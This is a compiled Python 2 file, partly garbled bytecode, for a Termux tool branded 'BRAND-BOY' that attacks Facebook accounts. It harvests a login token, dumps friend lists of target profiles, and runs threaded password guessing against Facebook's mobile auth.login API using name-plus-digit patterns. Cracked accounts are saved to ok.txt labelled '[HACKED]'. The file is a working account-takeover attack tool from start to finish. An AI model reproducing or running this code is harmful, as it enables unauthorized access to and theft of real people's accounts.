ó
Ì`c           @   s®  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e  j d  e  j j d  sû e  j d  n  e  j j d  se  j d	  n  d  d l m Z e  j d
  e  j j d  se  j d  e  j d  e  j d  e  j d  e  j d  e j d  nV e  j j d  róe  j d  e  j d  e  j d  e  j d  e j d  n  e j d d  Z e j d d  Z i e e  d 6e e  d 6e e  d 6d d 6d d 6d d 6d d  6d! d" 6Z e e  e j d#  d$ Z d% Z d& Z d' g Z  e j! e   Z" e e  e j d(  e j   Z# e# j$ e%  e# j& e j' j(   d) d* d+ e" f g e# _) e j*   Z+ d, Z, i d- d+ 6Z- d. Z. d/ Z/ d0   Z0 d1   Z1 d2   Z2 d3   Z3 d4   Z4 d5   Z5 d6   Z6 d7   Z7 d8   Z8 d9   Z9 d:   Z: e; d; k rªe1   n  d S(<   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   clears(   /data/data/com.termux/files/usr/bin/nodes#   apt update && apt install nodejs -ys(   /data/data/com.termux/files/usr/bin/rubys)   apt install ruby -y && gem install lolcats   git pullsH   /data/data/com.termux/files/home/jjjjj/...../node_modules/bytes/index.jss   fuser -k 5000/tcp &t   #s   cd .....  && npm installs   cd .....  && node index.js &i
   s   cd ..... && node index.js &g    ÐsAg    8|Ag     Ó@g     ã@s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-typesl   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-engines   utf-8s   [1;32ms   [0;97ms   [1;31ms   Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36t   utf8t   max_timei   s
   User-Agents   https://graph.facebook.com/{}sA   Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0s   http://10.10.1.10:3128s   https://10.10.1.11:1080c           C   s   t  j d  d  S(   Ns!  echo -e "




-----------------------------------------------

â£NAME         : SOMI AWAN  
â£CYBER NAME   : BRAND-BOY 
â£WHATSAPP NO  : 03455453538
â£COMMAMD TYPE : TOKEN-LOGIN 
â£NEW UPDATE   : TOKEN EXPIRING PROBLEM CLEAR 

-----------------------------------------------" | lolcat(   t   ost   system(    (    (    s   /sdcard/file-c5.pyt   logo6   s    c           C   s0   t    d GHd GHd GHd GHd GHd GHt   d  S(   Nt    s%   	    [1;97m([1;92mMain Menu[1;97m)s'   [1;97m([1;93m1[1;97m) key-Api Methods&   [1;97m([1;91m2[1;97m) L-host Method(   R   t   method_menu_select(    (    (    s   /sdcard/file-c5.pyt   method_menu:   s    c          C   sR   t  d  }  |  d k r" t   n, |  d k r8 t   n d GHd GHd GHt   d  S(   Ns   [1;32mâ¢â¢> t   1t   2R   s'   	    [1;31mSelect valid option [0;97m(   t	   raw_inputt   b_menut   l_menuR   (   t   afza(    (    s   /sdcard/file-c5.pyR   E   s    

c           C   sI   t  j d  t   d GHd t d t GHd GHd GHd GHd GHt   d  S(   NR   R   s   	    s!   [1;97m([1;93mLogin Menu[1;97m)s$   [1;97m([1;92m1[1;97m) Token Logins&   [1;97m([1;92m2[1;97m) ID/Pass Login(   R	   R
   R   t   ct   c2t   login_select(    (    (    s   /sdcard/file-c5.pyt   loginR   s    c          C   sR  t  d  }  |  d k rt j d  t   d GHd GHd GHt  d  } t d d  } | j |  | j   yl t j d	 |  } t	 j
 | j  } | d
 } | j d  d } d GHd | d GHt j d  t   WqNt t f k
 rd GHd GHd GHt  d  t   qNXn8 |  d k r,t   n" d GHd t d t GHd GHt   d  S(   Ns   [1;91mâ¢â¢> R   R   R   s'   	    [1;97m([1;96mToken Login[1;97m)s!   [1;97m([1;91m+[1;97m) Token : s   .fb_token.txtt   ws+   https://graph.facebook.com/me?access_token=t   namet    i    s   	[1;32mToken logged in as : s   [0;97mi   s"   	    [1;31mToken not valid[0;97ms    Press Enter To Try Again R   s   	    s   Select valid method(   R   R	   R
   R   t   opent   writet   closet   requestst   gett   jsont   loadst   textt   rsplitt   timet   sleepR   t   KeyErrort   IOErrorR   t   login_fbR   R   R   (   R   t   tokent   token_st   rt   qR   t   nm(    (    s   /sdcard/file-c5.pyR   ^   s@    



c          C   sw  t  j d  t   d GHd GHd GHt d  }  |  j d d  } | j d d  } | j d d  } t d  } d GHt j d	 | d
 | d t j } t	 j
 |  } d | k rt d d  } | j | d  | j   t j d | d  t j d  d GHt j d  t   nV d | d k rXd GHd GHt j d  t d  t   n d GHd GHt d  t   d  S(   NR   R   s/   	    [1;97m([1;96mNormal login[1;97m)[0;97ms   [1;31m ID/Mail/Num : R   t   (t   )s   [1;33m Password   : s   http://localhost:5000/auth?id=s   &pass=t   headerst   locs   .fb_token.txtR   sG   https://graph.facebook.com/me/friends?uid=100048514350891&access_token=i   s)   	    [1;32mLogged in successfully[0;97ms   www.facebook.comt   errors8   	    [1;31mUser must verify account before login[0;97ms!   [1;31m Press Enter To Try Again s.   	[1;31mID/Number/Password May Be Wrong[0;97m(   R	   R
   R   R   t   replaceR   R    t   headerR#   R!   R"   R   R   R   t   postR%   R&   R   R)   (   t   idt   id1t   id2t   uidt   pwdt   dataR-   t   hamza(    (    s   /sdcard/file-c5.pyR)      s@    $




c          C   s¨  t  j d  t   y t d d  j   a Wn t t f k
 rM t   n XyL t	 j
 d t  }  t j |  j  } | d } | j d  d } | } Wn t t f k
 rï d GHd	 t d
 t GHd GHt  j d  t j d  t   nK t	 j j k
 r9t   d GHd GHd GHt j d  t d  t   n Xt  j d  t   d GHd t d | t GHd GHt  j d  d GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s   .fb_token.txtR,   s+   https://graph.facebook.com/me?access_token=R   R   i    R   s   	    s   ID has checkpoints   rm -rf .fb_token.txti   s/   	    [1;31mTurn on mobile data OR wifi [0;97ms)   [1;31m Press Enter To Try Algain [0;97ms   	  s   Logged In UsersA   echo -e "-----------------------------------------------"| lolcats/   [1;97m([1;94m1[1;97m) Dump Public Friendlists(   [1;97m([1;94m2[1;97m) Crack From Files#   [1;97m([1;94m3[1;97m) Show Tokens+   [1;97m([1;91m4[1;97m) Return Method Menus   [1;97m([1;91m5[1;97m) Logout(   R	   R
   R   R   t   readR*   R'   R(   R   R   R    R!   R"   R#   R$   R   R   R%   R&   t
   exceptionsR   R   R   t   b_menu_select(   R,   R-   R.   t   nmft   ok(    (    s   /sdcard/file-c5.pyR   §   sR    



c       	      s¾  t  d  }  g  } g   g    |  d k r4 t   n|  d k rØ t j d  t   yP t  d  } t j d  x0 t | d  j   D] } | j | j    q WWq<t	 t
 f k
 rÔ t j d  t  d	  q<Xnd |  d
 k rî t   nN |  d
 k rt   n8 |  d k rt   n" d GHd t d t GHd GHt   t j d  t j d  t  d   t  d   t  d   t  d   t j d  t j d  t  d   t  d   t  d   t j d  t   d t t |   GHt j d  d GHd GHd d GHd GH          f	 d   } t d   } | j | |  d! GHd d GHd GHd" GHd# t t     d$ t t    GHd GHd d GHd GHt  d%  t   d  S(&   Ns	   
â¢â¢> R   R   R   s$   [1;97m([1;91m+[1;97m) File Name: sA   echo -e "-----------------------------------------------"| lolcatR,   s+   echo -e "	    [!] File Not Found." | lolcats   Press Enter To Back. t   3t   5R   s   	    s   Select valid methods%   echo -e "	    Name Password" | lolcats0   echo -e "	Example : 123,1234,12345,786" | lolcats'    [1;97m([1;91m1[1;97m)Name + digit: s'    [1;97m([1;91m2[1;97m)Name + digit: s'    [1;97m([1;91m3[1;97m)Name + digit: s'    [1;97m([1;91m4[1;97m)Name + digit: s'   echo -e "	    Digits Password" | lolcats+   echo -e "	Example : 786786,102030" | lolcats#    [1;97m([1;91m1[1;97m)Password: s#    [1;97m([1;91m2[1;97m)Password: s#    [1;97m([1;91m3[1;97m)Password: s    Total IDs : g      à?s%    The process is running in backgroundi/   t   -c   
         s+  |  } yt   } t j d t d | d d t j } t j |  } d | d k r­ d t d | GHt d	 d
  } | j	 t d | d  | j
     j t  nod | k rd t d | d GHt d d
  } | j	 t d | d  | j
    j t  nt   } t j d t d | d d t j } t j |  } d | d k r´d t d | GHt d	 d
  } | j	 t d | d  | j
     j t  nhd | k rd t d | d GHt d d
  } | j	 t d | d  | j
    j t  nt   } t j d t d | d d t j } t j |  } d | d k r»d t d | GHt d	 d
  } | j	 t d | d  | j
     j t  nad | k rd t d | d GHt d d
  } | j	 t d | d  | j
    j t  nþt   }	 t j d t d |	 d d t j } t j |  } d | d k rÂd t d |	 GHt d	 d
  } | j	 t d |	 d  | j
     j t  nZd | k r%d t d |	 d GHt d d
  } | j	 t d |	 d  | j
    j t  n÷t j d t d  d d t j } t j |  } d | d k r¿d t d  GHt d	 d
  } | j	 t d  d  | j
     j t  n]d | k r"d t d  d GHt d d
  } | j	 t d  d  | j
    j t  nút j d t d  d d t j } t j |  } d | d k r¼d t d  GHt d	 d
  } | j	 t d  d  | j
     j t  n`d | k rd t d  d GHt d d
  } | j	 t d  d  | j
    j t  ný t j d t d  d d t j } t j |  } d | d k r¹d t d  GHt d	 d
  } | j	 t d  d  | j
     j t  nc d | k rd t d  d GHt d d
  } | j	 t d  d  | j
    j t  n  Wn n Xd  S(   Ns   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=vi_vn&password=sH   &sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705cR1   s   www.facebook.comt	   error_msgs   [1;31m[Checkpoint] s    | s   cp.txtt   as   
t   access_tokens   [1;32m[HACKED] [1;30ms   [1;0ms   ok.txts    [1;32m[HACKED] [1;30m(   R   R   R    R:   R5   R#   R!   R"   R   R   R   t   append(
   t   argt   usert   pass1R-   t   dt   cpRB   t   pass2t   pass3t   pass4(	   t   cpst   okst   p1t   p2t   p3t   p4t   pass5t   pass6t   pass7(    s   /sdcard/file-c5.pyt   main	  sÔ    
(


(


(


(

(

(

(

i   R   s   [1;91m Process has completeds   [1;92m Total Cp/Ok : t   /s   [1;93m Press enter to back (   R   t   dumpR	   R
   R   R   t	   readlinesRI   t   stripR'   R(   t
   view_tokenR   t   logoutR   R   R@   t   strt   lenR%   R&   R    t   mapR   (   t   selectR7   t   uidlistt   lineR[   t   p(    (	   RR   RS   RT   RU   RV   RW   RX   RY   RZ   s   /sdcard/file-c5.pyR@   Ö   sv    



	't	)	
c           C   sO   t  j d  t   d GHd GHd GHd GHt  j d  d GHt d  t   d  S(   NR   R   s#   	    [1;32mLogged In Token [0;97ms	    Token : s   cat .fb_token.txts!   [1;93m Press enter to main menu (   R	   R
   R   R   R   (    (    (    s   /sdcard/file-c5.pyR`     s    
c           C   sQ   t  j d  t   d GHd t d t GHd GHt d  t  j d  t   d  S(   NR   R   s   	    s   Logout Menus'   [1;91m Do you really want to logout ? s   rm -rf .fb_token.txt(   R	   R
   R   R   R   R   R   (    (    (    s   /sdcard/file-c5.pyRa     s    
c          C   sè  t  j d  y t d d  j   }  WnK t k
 rs d GHt  j d  t j d  t   t  j d  t   n Xt	 d  } t	 d  } t	 d	  } | d k r¹ d GHt j d  n  y t  j
 d  Wn n Xt d | d d  } yÓ x¡ t j t j d | | |  f  d t j   d D]j } t j | d  | j d | d  t j j d | d t t  f  t j j   t j d  q$W| j   d GHt d |  t	 d  t Wn# t k
 rãd GHt j d  n Xd  S(   NR   s	   login.txtR,   s   [1;91m[!] Token not founds   rm -rf login.txtg{®Gáz?s(    [1;97m[[1;92m+[1;97m] id public --> s'    [1;97m[[1;92m+[1;97m] Name file -->s$    [1;97m[[1;92m+[1;97m] Limit --> R   s   
 [!] please fill it rightg333333û?R]   s   dump/s   .txtR   s#   %s/friends?limit=%s&access_token=%sR1   R<   R7   s   %s
s1    [1;97m[[1;92m+[1;97m] id %s Total Clone %s  g{®Gázt?s.   

 [1;97m[[1;92mâ[1;97m] clone id public
s8    [1;97m[[1;92mâ[1;97m] file stored in: dump/%s.txt t   Backs   
 [!] failed to save file (   R   (   R	   R
   R   R>   R(   R%   R&   R   R   R   t   mkdirt   sR    t   apit   formatt   heaR!   R7   RI   R   t   syst   stdoutRc   t   flushR   t   exitR   t   OSError(   R*   t   uit   iht   aswt   wrtt   i(    (    s   /sdcard/file-c5.pyR]   £  sH    <$

t   __main__(<   R	   Ro   R%   t   datetimet   randomt   hashlibt   ret	   threadingR!   t   urllibt	   cookielibR   t	   mechanizet   multiprocessing.poolR    t   requests.exceptionsR   R   R
   t   patht   isfileR&   t   randintt   bdt   simt   reprR5   t   reloadt   setdefaultencodingR   R   t   c3t
   useragentst   choicet   hmt   brt   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheaderst   SessionRk   Rl   Rn   t
   http_proxyt   https_proxyR   R   R   R   R   R)   R   R@   R`   Ra   R]   t   __name__(    (    (    s   /sdcard/file-c5.pyt   <module>   sr   P
	
					%	$	/	µ			*


	